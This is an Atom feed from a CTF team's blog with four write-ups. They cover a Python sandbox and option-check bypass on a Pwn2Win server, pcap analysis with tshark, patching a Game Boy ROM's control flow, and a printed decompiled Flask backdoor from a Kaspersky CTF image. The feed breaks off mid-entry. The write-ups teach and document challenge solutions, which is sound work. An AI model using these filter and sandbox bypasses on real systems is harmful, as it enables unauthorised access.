<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>TEAMROCKETIST</title>
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://teamrocketist.github.io/"/>
  <updated>2017-10-22T17:58:33.051Z</updated>
  <id>https://teamrocketist.github.io/</id>
  
  <author>
    <name>TEAMROCKETIST</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>[Pwn] Pwn2Win - Tokens v2.0</title>
    <link href="https://teamrocketist.github.io/2017/10/22/Pwn-Pwn2Win-Tokens-v2-0/"/>
    <id>https://teamrocketist.github.io/2017/10/22/Pwn-Pwn2Win-Tokens-v2-0/</id>
    <published>2017-10-22T17:47:30.000Z</published>
    <updated>2017-10-22T17:58:33.051Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br>Tokens v2.0<br><br>We have discovered that the upper echelon of Butcher Corp. uses a temporary token generator along with their brain chips as a form of 2FA(Two-Factor Authentication) for their most restricted systems. Our intel team got their source code, but we still haven’t got the seed right. We need you to get it for us, as we’re sure it will be useful for other systems! The name of one of this system’s users is “Dúfa van Tryggvadóttir”, vice president of the company.<br><br>Source Code:<br><br>Link<br><br>Mirror<br><br>Server: nc 200.136.213.114 4000<br><br>Id: tokens_v20<br><br>Total solves: 22<br><br>Score: 283<br><br>Categories: Exploitation<br></blockquote>

<p>This exploitation challenge is about this python script:<br><a href="https://pastebin.com/144yVeZF" target="_blank" rel="external">https://pastebin.com/144yVeZF</a></p>
<p>This challenge has 3 steps to be solved:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">1 - Find a regex that matches &quot;Dúfa van Tryggvadóttir&quot; with some restrictions.</div><div class="line">2 - Bypass de options checks and run gen function.</div><div class="line">3 - Bypass the Sand box and print the seed (Which was the flag).</div></pre></td></tr></table></figure>
<h3 id="Find-a-regex-that-matches-“Dufa-van-Tryggvadottir”-with-some-restrictions"><a href="#Find-a-regex-that-matches-“Dufa-van-Tryggvadottir”-with-some-restrictions" class="headerlink" title="Find a regex that matches “Dúfa van Tryggvadóttir” with some restrictions."></a>Find a regex that matches “Dúfa van Tryggvadóttir” with some restrictions.</h3><p>This is easy even with these restrictions:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">limit = <span class="number">22</span></div><div class="line"><span class="keyword">if</span> len(regex) &gt; limit:</div><div class="line">	<span class="keyword">print</span> <span class="string">"What kind of name is yours?"</span></div><div class="line">	exit()</div><div class="line">	</div><div class="line">tmp = re.findall(<span class="string">"[^A-z+]"</span>, regex)</div><div class="line">tmp1 = re.findall(<span class="string">"[\[\]]"</span>, regex)</div></pre></td></tr></table></figure>
<p>The first regex matches every single character not present in the list below <strong>[^A-z+]</strong>:  </p>
<ul>
<li><strong>A-z</strong> a single character in the range between <strong>A</strong> (index <em>65</em>) and <strong>z</strong> (index <em>122</em>) (case sensitive)  </li>
<li><strong>+</strong> matches the character <strong>+</strong> literally (case sensitive)  </li>
</ul>
<p>The second regex matches every single character present in the list below <strong>[[]]</strong>:  </p>
<ul>
<li><strong>[</strong> matches the character <strong>[</strong> literally (case sensitive)  </li>
<li><strong>]</strong> matches the character <strong>]</strong> literally (case sensitive)  </li>
</ul>
<p>So we can use characters from index <em>65</em> to index <em>122</em> any others outside this range is forbidden(consult <a href="ASCII TABLE">http://www.asciitable.com/index/asciifull.gif</a>) and we can’t user <strong>[</strong> or <strong>]</strong> and a limit of 22 characters.</p>
<p>Our aproach to this step was easy to find something that was equivalent to the <strong>.</strong> character, which in regex means matching any character except for new line, we have the <strong>+</strong> character. We used the following regex:<br><a data-fancybox="gallery" href="https://i.imgur.com/aJQxZ8T.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/aJQxZ8T.png" alt=""><br></a><br>If we test this in the binary we can see it worked!:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">$ nc 200.136.213.114 4000</div><div class="line">Hello! Log on to the Token Generation System</div><div class="line">If your name is not on the authorized list, a notification will be generated!</div><div class="line">For security reasons, NEVER <span class="built_in">type</span> your literal name.</div><div class="line">Type your regex-name to identify ([^\[\]][A-z+]): D\D+r</div><div class="line"></div><div class="line">Hello, Vice-President!</div><div class="line"></div><div class="line">[Open] - To create a new token</div><div class="line">[Revoke] - To Revoke a token</div><div class="line">Type the option:</div></pre></td></tr></table></figure>
<h3 id="Bypass-de-options-checks-and-run-gen-function"><a href="#Bypass-de-options-checks-and-run-gen-function" class="headerlink" title="Bypass de options checks and run gen function"></a>Bypass de options checks and run gen function</h3><p>This is the part of the code we need to analyse:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> role == <span class="string">"President"</span> <span class="keyword">and</span> <span class="string">"Open"</span> <span class="keyword">in</span> option <span class="keyword">or</span> <span class="string">"Revoke"</span> <span class="keyword">in</span> option:</div><div class="line">	authorized = <span class="number">1</span></div><div class="line"><span class="keyword">else</span>:</div><div class="line">	<span class="keyword">print</span> <span class="string">"For now, only the president is allowed to generate tokens."</span></div><div class="line">	exit()</div></pre></td></tr></table></figure>
<p>The first thing we have to do here is to choose Revoke, we don’t have the Presidents name so if we don’t want to exit the program, there will be a second check:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> authorized:</div><div class="line">	<span class="keyword">print</span> <span class="string">"\nFor security reasons, confirme your option!"</span></div><div class="line">	option = Option()</div><div class="line">	option_test = re.findall(<span class="string">'[\w]+'</span>, option)</div><div class="line">	<span class="keyword">for</span> s <span class="keyword">in</span> option_test:</div><div class="line">		<span class="keyword">if</span> s == <span class="string">"Open"</span>:</div><div class="line">			<span class="keyword">print</span> <span class="string">"Mr. President, enable the option to generate tokens on the server."</span></div><div class="line">			exit()</div><div class="line">		<span class="keyword">elif</span> s == <span class="string">"Revoke"</span>:</div><div class="line">			token = raw_input(<span class="string">"Type your token serial: "</span>).strip()</div><div class="line">			<span class="keyword">if</span> len(token) &gt; <span class="number">4</span> <span class="keyword">or</span> token.isdigit() != <span class="keyword">True</span>:</div><div class="line">				<span class="keyword">print</span> <span class="string">"Revise your token!"</span></div><div class="line">				exit()</div><div class="line">			<span class="keyword">else</span>:</div><div class="line">				open = file(<span class="string">"canceled-tokens.txt"</span>, <span class="string">"a"</span>)</div><div class="line">				time = datetime.now()</div><div class="line">				open.writelines(<span class="string">"\nToken canceled at: %02d/%02d/%02d %02d:%02d:%02d:\n"</span> % (time.month, time.day, time.year, time.hour, time.minute, time.second))</div><div class="line">				open.writelines(token)</div><div class="line">				open.close()</div><div class="line">				<span class="keyword">print</span> <span class="string">"This will go through by a manual inspection, thank you Mr. "</span> + role + <span class="string">"!"</span></div><div class="line">				exit()</div><div class="line">		<span class="keyword">else</span>:</div><div class="line">			<span class="keyword">print</span> <span class="string">"Incorrect option, please, try again!"</span>	</div><div class="line">		</div><div class="line">	option = string(option)</div></pre></td></tr></table></figure>
<p>As we can see above doesn’t matter what we choose we will always exit the program so what we do here? we need to find a trick, to bypass this and still have the option “Open” as we can see in the end they are removing all <strong>\</strong> of the string in the final of the loop:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">string</span><span class="params">(object)</span>:</span></div><div class="line"></div><div class="line">	<span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, string)</span>:</span></div><div class="line">		self.string = string</div><div class="line">		</div><div class="line">	<span class="function"><span class="keyword">def</span> <span class="title">strip</span><span class="params">(self)</span>:</span></div><div class="line">		test = re.findall(<span class="string">r"[\\\n\t\r]"</span>, self.string)</div><div class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> test:</div><div class="line">			self.string = self.string.replace(i, <span class="string">""</span>)</div><div class="line">		</div><div class="line">		<span class="keyword">return</span> self.string</div></pre></td></tr></table></figure>
<p>And the calls:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">        <span class="string">"Truncated code of the loop"</span></div><div class="line">        option = string(option)</div><div class="line"><span class="keyword">if</span> option.strip() == <span class="string">"Open"</span>:</div><div class="line">        gen()</div></pre></td></tr></table></figure></p>
<p>This very useful! this removes newlines or \ characters! The regex expression that splits the string does this:<br><a data-fancybox="gallery" href="https://i.imgur.com/cjgXXF9.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/cjgXXF9.png" alt=""><br></a></p>
<p>If we inject <strong>O\pen</strong> it will match the words <strong>O</strong> and <strong>pen</strong> and when we enter in the loop we won’t choose any of the options not exiting the program, after this the <strong>string class</strong> will help us getting the <strong>Open</strong> string!<br>If we do this we will run the <strong>gen</strong> function:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">$ nc 200.136.213.114 4000</div><div class="line">Hello! Log on to the Token Generation System</div><div class="line">If your name is not on the authorized list, a notification will be generated!</div><div class="line">For security reasons, NEVER <span class="built_in">type</span> your literal name.</div><div class="line">Type your regex-name to identify ([^\[\]][A-z+]): D\D+r</div><div class="line"></div><div class="line">Hello, Vice-President!</div><div class="line"></div><div class="line">[Open] - To create a new token</div><div class="line">[Revoke] - To Revoke a token</div><div class="line">Type the option: Revoke</div><div class="line"></div><div class="line">For security reasons, confirme your option!</div><div class="line">[Open] - To create a new token</div><div class="line">[Revoke] - To Revoke a token</div><div class="line">Type the option: O\pen</div><div class="line">Incorrect option, please, try again!</div><div class="line">Incorrect option, please, try again!</div><div class="line"></div><div class="line">Usage:</div><div class="line">gen <span class="string">'token serial number'</span></div><div class="line"></div><div class="line">E.g.:</div><div class="line">gen 2017</div><div class="line"></div><div class="line">&gt;&gt;&gt;</div></pre></td></tr></table></figure>
<h3 id="Bypass-the-Sand-box-and-print-the-seed-Which-was-the-flag"><a href="#Bypass-the-Sand-box-and-print-the-seed-Which-was-the-flag" class="headerlink" title="Bypass the Sand box and print the seed (Which was the flag)"></a>Bypass the Sand box and print the seed (Which was the flag)</h3><p>First we have some characters we can’t use:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">validation</span><span class="params">(input)</span>:</span></div><div class="line">	err = int()</div><div class="line">	input = str(input)</div><div class="line">	nochrs = <span class="string">'[&amp;*+-/34689?\&lt;_&gt;!@#`|$%;&#123;&#125;]'</span></div><div class="line">	<span class="keyword">if</span> re.findall(nochrs, input): err = <span class="number">1</span></div><div class="line">	<span class="keyword">else</span>: err = <span class="number">0</span></div><div class="line">		</div><div class="line">	<span class="keyword">if</span> <span class="keyword">not</span> err: <span class="keyword">return</span> <span class="number">1</span></div><div class="line">	<span class="keyword">else</span>: <span class="keyword">return</span> <span class="number">0</span></div></pre></td></tr></table></figure>
<p>Analysing the regular expression we have:<br><a data-fancybox="gallery" href="https://i.imgur.com/1aVNBTa.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/1aVNBTa.png" alt=""><br></a></p>
<p>The characters between the range <em>43</em> and <em>47</em> are:<br><a data-fancybox="gallery" href="https://i.imgur.com/X3vFwws.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/X3vFwws.png" alt=""><br></a></p>
<p>We can’t use any of the characters above and there is more, we can’t use most of the built_in functions because they are being removed here:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">safe</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">from</span> sys <span class="keyword">import</span> modules</div><div class="line">    modules.clear()</div><div class="line">    <span class="keyword">del</span> modules</div><div class="line">    <span class="keyword">global</span> input, compile, execfile, globals, vars, open, file, reload, __import__, locals, dir</div><div class="line">    input, compile, execfile, globals, vars, locals, open, file, reload, __import__, dir = <span class="keyword">None</span>, <span class="keyword">None</span>, <span class="keyword">None</span>, <span class="keyword">None</span>, <span class="keyword">None</span>, <span class="keyword">None</span>, <span class="keyword">None</span>, <span class="keyword">None</span>, <span class="keyword">None</span>, <span class="keyword">None</span>, <span class="keyword">None</span></div><div class="line">    __builtins__.dir = <span class="keyword">None</span></div></pre></td></tr></table></figure>
<p>We tried hard to bypass and we couldn’t do it, we knew that we needed to run <strong>raw_input(seed)</strong> this function would print the seed for us unfortunately the <strong>_</strong> character was filtered too, so we found this function within the code:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">Option</span><span class="params">()</span>:</span></div><div class="line">	<span class="keyword">print</span> <span class="string">"[Open] - To create a new token"</span></div><div class="line">	<span class="keyword">print</span> <span class="string">"[Revoke] - To Revoke a token"</span></div><div class="line">	opt = raw_input(<span class="string">"Type the option: "</span>)</div><div class="line">	<span class="keyword">return</span> opt</div></pre></td></tr></table></figure>
<p>This is perfect if we run <strong>gen Options()</strong> it will run another <strong>raw_input</strong> without any filters and then we can inject any character we want! Here is the example how to do it:<br><a data-fancybox="gallery" href="https://i.imgur.com/R3FxQXf.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/R3FxQXf.png" alt=""><br></a><br>The flag was <strong>CTF-BR{fiev4zi3Nais7ue7aiSh}</strong></p>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;br&gt;Tokens v2.0&lt;br&gt;&lt;br&gt;We have discovered that the upper echelon of Butcher Corp. uses a temporary token generator along with th
    
    </summary>
    
      <category term="Pwn" scheme="https://teamrocketist.github.io/categories/Pwn/"/>
    
    
      <category term="python" scheme="https://teamrocketist.github.io/tags/python/"/>
    
      <category term="pwn" scheme="https://teamrocketist.github.io/tags/pwn/"/>
    
      <category term="sandbox" scheme="https://teamrocketist.github.io/tags/sandbox/"/>
    
      <category term="regex" scheme="https://teamrocketist.github.io/tags/regex/"/>
    
      <category term="pwn2winctf" scheme="https://teamrocketist.github.io/tags/pwn2winctf/"/>
    
  </entry>
  
  <entry>
    <title>[Forensics] Square CTF - Sniffed Off the Wire</title>
    <link href="https://teamrocketist.github.io/2017/10/16/Forensics-Square-CTF-Sniffed-Off-the-Wire/"/>
    <id>https://teamrocketist.github.io/2017/10/16/Forensics-Square-CTF-Sniffed-Off-the-Wire/</id>
    <published>2017-10-16T18:26:03.000Z</published>
    <updated>2017-10-16T18:35:02.283Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br>Sniffed Off the Wire<br>🚩<br>Sifting through the noise<br>100 points<br>Forensics<br><br>After weeks of perching, our avian operatives captured a suspicious network flow. Maybe there’s valuable data inside?<br><a href="https://cdn.squarectf.com/challenges/sniffed-off-the-wire.pcap" target="_blank" rel="external">https://cdn.squarectf.com/challenges/sniffed-off-the-wire.pcap</a><br></blockquote>

<p>We have pcap analysing it in wireshark, if we follow the tcp stream we can see alot of strange characters:<br><a data-fancybox="gallery" href="https://i.imgur.com/HrSWCVj.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/HrSWCVj.png" alt=""><br></a><br>This strange characters are known as terminal characters, they can do alot of things like changing the color printed in the terminal and do alot of other stuff. If we print some characters like this in the terminal with c/python/perl/ruby etc:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">bcolors</span>:</span></div><div class="line">    HEADER = <span class="string">'\033[95m'</span> <span class="keyword">with</span></div><div class="line">    OKBLUE = <span class="string">'\033[94m'</span></div><div class="line">    OKGREEN = <span class="string">'\033[92m'</span></div><div class="line">    WARNING = <span class="string">'\033[93m'</span></div><div class="line">    FAIL = <span class="string">'\033[91m'</span></div><div class="line">    ENDC = <span class="string">'\033[0m'</span></div><div class="line">    BOLD = <span class="string">'\033[1m'</span></div><div class="line">    UNDERLINE = <span class="string">'\033[4m'</span></div><div class="line"><span class="keyword">print</span> bcolors.WARNING + <span class="string">"Warning: No active frommets remain. Continue?"</span> + bcolors.ENDC</div></pre></td></tr></table></figure>
<p>It’s going to print the text as yellow in the terminal, those characters on wireshark will do same but with another functions not just changing the color, first we need to decode all this hex decimal in the data field of each <code>TCP</code> package:<br><a data-fancybox="gallery" href="https://i.imgur.com/USynWoq.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/USynWoq.png" alt=""><br></a><br>Lets use bash to get all the hexadecimal and convert it to text:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tshark -r sniffed-off-the-wire.pcap -Y <span class="string">"data"</span> -Tfields -e data.data | tr -d <span class="string">':|\n'</span> | xxd -r -p</div></pre></td></tr></table></figure>
<p>Those characters are actually writing the flag and then delete it, I actually needed to print-screen the terminal, with this I ended up getting the flag:<br><a data-fancybox="gallery" href="https://i.imgur.com/0uQFjce.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/0uQFjce.png" alt=""><br></a></p>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;br&gt;Sniffed Off the Wire&lt;br&gt;🚩&lt;br&gt;Sifting through the noise&lt;br&gt;100 points&lt;br&gt;Forensics&lt;br&gt;&lt;br&gt;After weeks of perching, our avian
    
    </summary>
    
      <category term="Forensics" scheme="https://teamrocketist.github.io/categories/Forensics/"/>
    
    
      <category term="forensics" scheme="https://teamrocketist.github.io/tags/forensics/"/>
    
      <category term="wireshark" scheme="https://teamrocketist.github.io/tags/wireshark/"/>
    
      <category term="tshark" scheme="https://teamrocketist.github.io/tags/tshark/"/>
    
      <category term="terminal_characters" scheme="https://teamrocketist.github.io/tags/terminal-characters/"/>
    
      <category term="squarectf" scheme="https://teamrocketist.github.io/tags/squarectf/"/>
    
  </entry>
  
  <entry>
    <title>[Reverse] Square CTF - The Turing Agent</title>
    <link href="https://teamrocketist.github.io/2017/10/16/Reverse-Square-CTF-The-Turing-Agent/"/>
    <id>https://teamrocketist.github.io/2017/10/16/Reverse-Square-CTF-The-Turing-Agent/</id>
    <published>2017-10-16T00:08:25.000Z</published>
    <updated>2017-10-17T06:44:24.905Z</updated>
    
    <content type="html"><![CDATA[<blockquote>The Turing Agent<br><br>A Small Gameboy CTF<br>500 points<br>Reverse<br><br>The hamsters have triumphed! We found an open Github repository (<a href="https://github.com/Ahris/the_turing_agent)!" target="_blank" rel="external">https://github.com/Ahris/the_turing_agent)!</a> It looks like some sort of game; perhaps they’re planning to trick our humans into playing it. We need to know if there’s any data hidden in the game that might harm our humans.<br><br>Note: You’ll need to prepend “flag-“ to the flag.<br></blockquote>

<p>A game boy classic rom to analyse, at first I tried to search in the web for a nice debugger for this and most people online were recommending to use <a href="http://bgb.bircd.org/" target="_blank" rel="external">http://bgb.bircd.org/</a> classifying it as the best, well unfortunately I didn’t manage to understand this debugger very well so once again searching in the web I found a much more intuitive debugger named No$GMB (<a href="http://problemkaputt.de/gmb.htm" target="_blank" rel="external">http://problemkaputt.de/gmb.htm</a>) with this one it was much easier to solve the challenge.</p>
<p>Opening the rom with No$GMB we can see that the game starts we get some conversation until we reach a locked door which requires a code (combination of multiple gameboy keys), if we get the correct combination we can get the flag:<br><a data-fancybox="gallery" href="https://i.imgur.com/RfAUXmN.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/RfAUXmN.png" alt=""><br></a></p>
<p>As you can see in the image above I put a break point at <code>0x337C</code> which is a jump, I did a break point here because I noticed its some kind of a loop which will only end when all the keys are inserted to unlock the door so my plan was not to actually understand how the architecture of the gameboy works but to try to bypass the combination verification by changing the flags of jump instructions and try to find the winner function:<br><a data-fancybox="gallery" href="https://i.imgur.com/GFSYeFY.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/GFSYeFY.png" alt=""><br></a><br>To avoid being stuck in the loop without pressing any keys we can just disable the carry flag and it will not jump as we can see in the image bellow the “[]” disappears:<br><a data-fancybox="gallery" href="https://i.imgur.com/FVd1mXW.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/FVd1mXW.png" alt=""><br></a><br>This is how I manipulated the game, by changing the control flow of the program to try to jump into a winner function, after multiple steps I ended up in the final road to finish the challenge as you can see bellow:<br><a data-fancybox="gallery" href="https://i.imgur.com/jRxSeqm.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/jRxSeqm.png" alt=""><br></a><br>By going to the next lines of the conversation we got the flag:<br><a data-fancybox="gallery" href="https://i.imgur.com/Su2uxAW.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/Su2uxAW.png" alt=""><br></a></p>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;The Turing Agent&lt;br&gt;&lt;br&gt;A Small Gameboy CTF&lt;br&gt;500 points&lt;br&gt;Reverse&lt;br&gt;&lt;br&gt;The hamsters have triumphed! We found an open Github
    
    </summary>
    
      <category term="Reverse" scheme="https://teamrocketist.github.io/categories/Reverse/"/>
    
    
      <category term="squarectf" scheme="https://teamrocketist.github.io/tags/squarectf/"/>
    
      <category term="reverse" scheme="https://teamrocketist.github.io/tags/reverse/"/>
    
      <category term="gameboy" scheme="https://teamrocketist.github.io/tags/gameboy/"/>
    
      <category term="no$gmb" scheme="https://teamrocketist.github.io/tags/no-gmb/"/>
    
  </entry>
  
  <entry>
    <title>[Reverse] Kaspersky Industrial CTF Quals 2017 - Backdoor Pi</title>
    <link href="https://teamrocketist.github.io/2017/10/08/Reverse-Kaspersky-Industrial-CTF-Quals-2017-Backdoor-Pi/"/>
    <id>https://teamrocketist.github.io/2017/10/08/Reverse-Kaspersky-Industrial-CTF-Quals-2017-Backdoor-Pi/</id>
    <published>2017-10-08T15:00:48.000Z</published>
    <updated>2017-10-08T16:05:31.881Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br>We are doing an project for a school competition in which we need to use a Raspberry Pi to make an IOT prototype. We received SD cards from the professor, and because we lost ours we asked another group to give us a copy of their card, I know it’s been modified because the original hash doesn’t match. Could you please investigate and tell me if everything is ok? Here is some parts of the file system:<br><br>FLAG FORMAT: KLCTF{flag}<br><br>download this file: <a href="https://s3.eu-central-1.amazonaws.com/klctf/fs.zip" target="_blank" rel="external">https://s3.eu-central-1.amazonaws.com/klctf/fs.zip</a><br></blockquote>

<p>By reading the description we know the attacker added some kind of backdoor our first intuition was to check the crontab files:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ ls var/spool/cron/crontabs/</div><div class="line">b4ckd00r_us3r  pi</div></pre></td></tr></table></figure>
<p>By checking the b4ckd00r_us3r we found out the backdoor is running in this cron task:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">cat var/spool/cron/crontabs/b4ckd00r_us3r </div><div class="line"># DO NOT EDIT THIS FILE - edit the master and reinstall.</div><div class="line"># (/tmp/crontab.80NKS4/crontab installed on Wed Oct  4 19:28:12 2017)</div><div class="line"># (Cron version -- $Id: crontab.c,v 2.13 1994/01/17 03:20:37 vixie Exp $)</div><div class="line"># m h  dom mon dow   command</div><div class="line">@reboot python /bin/back</div></pre></td></tr></table></figure>
<p>By checking what kind of file /bin/back is: </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ file bin/back</div><div class="line">bin/back: python 2.7 byte-compiled</div></pre></td></tr></table></figure>
<p>It’s a python compiled file we used <a href="uncompyle2">https://github.com/wibiti/uncompyle2</a> to uncompyle and we got this:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># uncompyle6 version 2.12.0</span></div><div class="line"><span class="comment"># Python bytecode 2.7 (62211)</span></div><div class="line"><span class="comment"># [GCC 6.3.0 20170118]</span></div><div class="line"><span class="comment"># Embedded file name: back.py</span></div><div class="line"><span class="comment"># Compiled at: 2017-10-05 09:09:10</span></div><div class="line"><span class="keyword">import</span> sys</div><div class="line"><span class="keyword">import</span> os</div><div class="line"><span class="keyword">import</span> time</div><div class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</div><div class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</div><div class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> abort</div><div class="line"><span class="keyword">import</span> hashlib</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_creds</span><span class="params">(user, pincode)</span>:</span></div><div class="line">    <span class="keyword">if</span> len(pincode) &lt;= <span class="number">8</span> <span class="keyword">and</span> pincode.isdigit():</div><div class="line">        val = <span class="string">'&#123;&#125;:&#123;&#125;'</span>.format(user, pincode)</div><div class="line">        key = hashlib.sha256(val).hexdigest()</div><div class="line">        <span class="keyword">if</span> key == <span class="string">'34c05015de48ef10309963543b4a347b5d3d20bbe2ed462cf226b1cc8fff222e'</span>:</div><div class="line">            <span class="keyword">return</span> <span class="string">'Congr4ts, you found the b@ckd00r. The fl4g is simply : &#123;&#125;:&#123;&#125;'</span>.format(user, pincode)</div><div class="line">    <span class="keyword">return</span> abort(<span class="number">404</span>)</div><div class="line"></div><div class="line"></div><div class="line">app = Flask(__name__)</div><div class="line"></div><div class="line"><span class="meta">@app.route('/')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">return</span> <span class="string">'&lt;h1&gt;HOME&lt;/h1&gt;'</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="meta">@app.route('/backdoor')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">backdoor</span><span class="params">()</span>:</span></div><div class="line">    user = request.args.get(<span class="string">'user'</span>)</div><div class="line">    pincode = request.args.get(<span class="string">'pincode'</span>)</div><div class="line">    <span class="keyword">return</span> check_creds(user, pincode)</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    app.run(threaded=<span class="keyword">True</span>, host=<span class="string">'0.0.0.0'</span>, port=<span class="number">3333</span>)</div><div class="line"><span class="comment"># okay decompiling back.pyc</span></div></pre></td></tr></table></figure>
<p>We have a hash and we know it is composed in the following format:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">user:pincode</div></pre></td></tr></table></figure>
<p>Checking the user in /etc/passwd</p>
